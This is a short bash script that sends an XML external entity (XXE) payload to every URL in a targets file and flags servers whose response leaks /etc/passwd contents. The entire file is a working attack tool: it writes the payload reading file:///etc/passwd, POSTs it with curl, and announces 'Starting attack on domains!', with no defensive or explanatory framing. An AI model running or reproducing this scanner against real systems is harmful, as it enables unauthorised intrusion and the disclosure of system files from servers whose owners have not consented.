#!/bin/bash

test -e targets.txt || echo -e "\e[91mTarget file not found :("
test -e xml.txt || echo -e "\e[93mXML file not found, no worries it will be made! :D" 

time while read -r target; do


    echo "\e[93mPreparing script.. "

    if [ -f xml.txt ]; then
        echo -e "\e[32mPayload Exists! "
    else
        cat <<- XMLFILE >> "xml.txt"
	<!DOCTYPE foo [
	<!ELEMENT foo ANY >
	<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
	XMLFILE
    fi

    echo "Starting attack on domains!"

    if curl -s -d @xml.txt --header "Content-Type: application/xml;charset=UTF-8" "$target" | grep -q "root:x"; then
        echo -e "\e[91mTarget $target might be vulnerable to XXE."
    else
        echo -e "\e[32mTarget $target is not vulnerable to XXE."
    fi

done < targets.txt
